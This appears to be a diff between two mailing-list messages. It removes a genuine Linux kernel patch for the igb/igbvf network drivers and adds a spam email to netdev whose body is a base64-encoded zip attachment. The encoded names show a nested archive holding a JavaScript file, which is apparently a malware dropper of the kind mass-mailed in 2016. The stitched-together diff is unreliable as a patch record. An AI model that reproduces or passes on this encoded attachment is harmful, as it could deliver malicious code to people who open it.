@@ -1,82 +1,55 @@
-From: Alexander Duyck <alexander.h.duyck@intel.com>
-Subject: [net PATCH 1/2] igb/igbvf: Don't use lco_csum to compute IPv4
- checksum
-Date: Mon, 28 Nov 2016 10:42:23 -0500
-Message-ID: <20161128154223.15466.69052.stgit@ahduyck-blue-test.jf.intel.com>
-References: <20161128153927.15466.99193.stgit@ahduyck-blue-test.jf.intel.com>
+From: <salome.khum@vision-france.net>
+Subject: (unknown)
+Date: Mon, 28 Nov 2016 21:46:12 -0000
+Message-ID: <148036957274.14474.9706479526621246835@goldenhomes.co.nz>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
-Cc: sfr@canb.auug.org.au, davem@davemloft.net,
-        jeffrey.t.kirsher@intel.com
-To: netdev@vger.kernel.org, intel-wired-lan@lists.osuosl.org
+Content-Type: application/zip; name="MESSAGE_5999780_netdev.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mga11.intel.com ([192.55.52.93]:8287 "EHLO mga11.intel.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1755587AbcK1Vn7 (ORCPT <rfc822;netdev@vger.kernel.org>);
-        Mon, 28 Nov 2016 16:43:59 -0500
-In-Reply-To: <20161128153927.15466.99193.stgit@ahduyck-blue-test.jf.intel.com>
+Received: from mail.goldenhomes.co.nz ([111.69.28.34]:57524 "HELO
+        goldenhomes.co.nz" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752456AbcK1VqU (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Mon, 28 Nov 2016 16:46:20 -0500
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-In the case of IPIP and SIT tunnel frames the outer transport header
-offset is actually set to the same offset as the inner transport header.
-This results in the lco_csum call not doing any checksum computation over
-the inner IPv4/v6 header data.
-
-In order to account for that I am updating the code so that we determine
-the location to start the checksum ourselves based on the location of the
-IPv4 header and the length.
-
-Fixes: e10715d3e961 ("igb/igbvf: Add support for GSO partial")
-Reported-by: Stephen Rothwell <sfr@canb.auug.org.au>
-Signed-off-by: Alexander Duyck <alexander.h.duyck@intel.com>
----
- drivers/net/ethernet/intel/igb/igb_main.c |    8 ++++++--
- drivers/net/ethernet/intel/igbvf/netdev.c |    8 ++++++--
- 2 files changed, 12 insertions(+), 4 deletions(-)
-
-diff --git a/drivers/net/ethernet/intel/igb/igb_main.c b/drivers/net/ethernet/intel/igb/igb_main.c
-index 59125b1..76ce0cc 100644
---- a/drivers/net/ethernet/intel/igb/igb_main.c
-+++ b/drivers/net/ethernet/intel/igb/igb_main.c
-@@ -4922,11 +4922,15 @@ static int igb_tso(struct igb_ring *tx_ring,
- 
- 	/* initialize outer IP header fields */
- 	if (ip.v4->version == 4) {
-+		unsigned char *csum_start = skb_checksum_start(skb);
-+		unsigned char *trans_start = ip.hdr + (ip.v4->ihl * 4);
-+
- 		/* IP header will have to cancel out any data that
- 		 * is not a part of the outer IP header
- 		 */
--		ip.v4->check = csum_fold(csum_add(lco_csum(skb),
--						  csum_unfold(l4.tcp->check)));
-+		ip.v4->check = csum_fold(csum_partial(trans_start,
-+						      csum_start - trans_start,
-+						      0));
- 		type_tucmd |= E1000_ADVTXD_TUCMD_IPV4;
- 
- 		ip.v4->tot_len = 0;
-diff --git a/drivers/net/ethernet/intel/igbvf/netdev.c b/drivers/net/ethernet/intel/igbvf/netdev.c
-index b0778ba..e3a80ac 100644
---- a/drivers/net/ethernet/intel/igbvf/netdev.c
-+++ b/drivers/net/ethernet/intel/igbvf/netdev.c
-@@ -1965,11 +1965,15 @@ static int igbvf_tso(struct igbvf_ring *tx_ring,
- 
- 	/* initialize outer IP header fields */
- 	if (ip.v4->version == 4) {
-+		unsigned char *csum_start = skb_checksum_start(skb);
-+		unsigned char *trans_start = ip.hdr + (ip.v4->ihl * 4);
-+
- 		/* IP header will have to cancel out any data that
- 		 * is not a part of the outer IP header
- 		 */
--		ip.v4->check = csum_fold(csum_add(lco_csum(skb),
--						  csum_unfold(l4.tcp->check)));
-+		ip.v4->check = csum_fold(csum_partial(trans_start,
-+						      csum_start - trans_start,
-+						      0));
- 		type_tucmd |= E1000_ADVTXD_TUCMD_IPV4;
- 
- 		ip.v4->tot_len = 0;
+UEsDBAoAAgAAAAEdfUnu4x5cbgcAAG4HAAAFABwANy56aXBVVAkAAzKkPFgypDxYdXgLAAEEAAAA
+AAQAAAAAUEsDBBQAAgAIAAEdfUlLGTuX0AYAAAMWAAAEABwANy5qc1VUCQADMqQ8WDGkPFh1eAsA
+AQQAAAAABAAAAACVWF1zpDYWfR7/Cop9sF2a6bGdbDYbl7M12cTJQ+ajtl2VqSJ+ECBAtEAgJEBs
+5b+vkEQ3tCVXrR/R1dX9OPfc0+4hC2hcyJgGD0GNhuADY1Behffh2+Dd7XV083x/0SublNEhFVV3
+ZhYEZ3aibeghUUZRePsufD5+z2ORSYa3t3EXnm5OOTxQfREGq4s9LBs5f353+zYIe6jfe45u7TGe
+ClHIrVteaKNtYJjIAzzL8Tz4ihIab2z0o6xWYd4eE8SxjNkxIhiFq2hGWIvtIyxY5Qg5GtX96uUb
+XKzeQDxDNSXtS7OHJeTFNOGUyJd2t88rd7hPZELzs7jQKq6+Q0RUqbIw5QY2E2C7Ak4hgaXk4NhT
+YIsLji+BU6bAVhWsIASOVQQLYIDNBFg03l/oOKOwYZRTLhukyhzWIpEkfF6KP6fzKOqEY1pf2Ryu
+t/gQBFc4QxpXFVLFu/zb5fNO+7m6tk0pR8Rgj3S9o8v6Uhu5LMU44ilBOfxW+6OpDL22uIatINru
+aY7ea9jlKMY1EU16o9+H5JH6Q2gITcV0oJn2TFCdO3NKO5lmqDzAOxNp40m9FQXO6a1+uEM/+d9N
+CG071Ij8O22L3PXpUN+ivEXxoKz+2CcMN9wcjTCrYdzQiZsRr16piMwr2ok6p6bMvyK+d0bfwpby
+THa6u5efG3dQiOSyrUWhjZh4pb2soIcWElXflv5DP72HvT/MQwYHyBrYJIa2UNV8csaZFzRr8AAH
+rO0ER1+cdhzVo0iNUYMS7DQqKjSVMG+lIdkUkVcqObSIVDjnokU3a3Cfmamu4KKUHcEaLpdcdG5M
+j2ic7MP/QZ0zvrKXmagHqMk2CufRdNqNkIgyocwEFnL06M63FV0sJzSaqnicQdKi/iAOiUEyL/xN
+rmUv2STso6+AMGllikYDdwXBJ6cVaWSJywkx45CkiDkDxLwQpRxg970ZnyfqxmqeoonRhqMF+R9e
+YZgRJxPMa/SNNv6DuQso84zmjLJBW8UdJX6XkMOMVrGp4hfaYQ8XQEZgifV4Xs5T7i83bTPRYGJC
+/DehbtCgArMK8wP8p6FAXnxyj1xKqwGRAhV66c2cVafu4rCSJinqOxw3pjXkE3S3psWsRyku0jvL
+qR6zRBa4NlV0m9CKUBVhjTtt9IhfqXQKC9jnwqRbuZkLxpNUa1QYGtxz6HenWjXmomwNDBv+KNx1
+Vqtbq7MV0MAKIWDNVWDdFrBicKsZJClgUs59OC0lsBpFu94YquoZzifUgFW4YNspsCzsZQjx1Ku7
+q40AjjQJNqsTrGbRlq+irJ7Z9DjKYMPZYGmCZd8DHsuZyVe7E6zEgR14HCuuVFan5QM2NGsDH2Kk
+9dQasXZ6lGpJcD7T43HcwIo2rYOS1nNpjYywbN7RVrRkLuYJGmDN3pYya6mRtSIIsPCeXSI9HKm2
+MIQOTjQLTqIArASP1eiV6oi6t92UYE1vYD0GYKUbLALTEo+1mFXAkRrAcbhs4w4tKvVWX3a31T44
+zeaoVysQrPcIWM/yIn3pDPeVMLFKZYpRjYpx0cRKQvbo6+e4RAm/isIuYa5ZUy9EoZI0/rMXckx/
+3i27zXFGlj3qOJOd/ylUffaeqTS8Zwk/i9BSQ6bU7Cx6lspEkSGL+ZfYsyrJ7ctr3YB5UgRX+moU
+LYSgbwQ/Bt9eB/+9SKBqJGcC/XDxRmMYlTK5sWU/avdI/Rzhwhszq4MPoTMX3PsLpNrpPZz77PJ4
+f57lzJxvYobg4f7iLzOZTY4URcy1mtEVRYbhdNaWjEvEjEiad6PrmYbj2htbvnt0XiJoL13fO44q
+r7PP/xcWLPcUB8kn0Rhl9uFnP9B+/mnnPdtz5ooWweoVSTPgPJZZfWcBYtBydQzo2jm91kqXfVF5
+YmLouw2c9S4xaL4zofyp/l6GeLphFoi5sgQ4ibzCfzeCa584M1QEsXN93xeI+GnAoyhgkRot+HH/
+1Xv54+93Ttr5+tH1+fffnryenr68ojHYALMWNgP+/qzwOsqlQqXsYZpKftYdWzlrVaHkgAr9X5Sw
+4H6Wa35470rh/TC4Pg876PosOPUPG3NeaQrq+nzYOVmDNu+9D8C0coKk3rnfbbye/pU9eM/udqnL
+HeTudq5aGUVG+Cw8/+svTnS8XVr2Npin8DioUWQU0XFKNq6NDDqerW4tKsgsi4fgZnOq1c9ypIQk
+zoKrjeNFClmbh+Du5mZeN3rHKD0oxwmnGl1JlXqrtkOjk6ICJ+iSwOPIkI3aE6sMtAYziW8C18pL
+f7/eXtDSylww/s7OF+F0LOab06QpqjKSyRwu+ZtW/XVxYjStoIzRssau7/8HUEsBAh4DFAACAAgA
+AR19SUsZO5fQBgAAAxYAAAQAGAAAAAAAAQAAAKSBAAAAADcuanNVVAUAAzKkPFh1eAsAAQQAAAAA
+BAAAAABQSwUGAAAAAAEAAQBKAAAADgcAAAAAUEsBAh4DCgACAAAAAR19Se7jHlxuBwAAbgcAAAUA
+GAAAAAAAAAAAAKSBAAAAADcuemlwVVQFAAMypDxYdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEA
+SwAAAK0HAAAAAA==
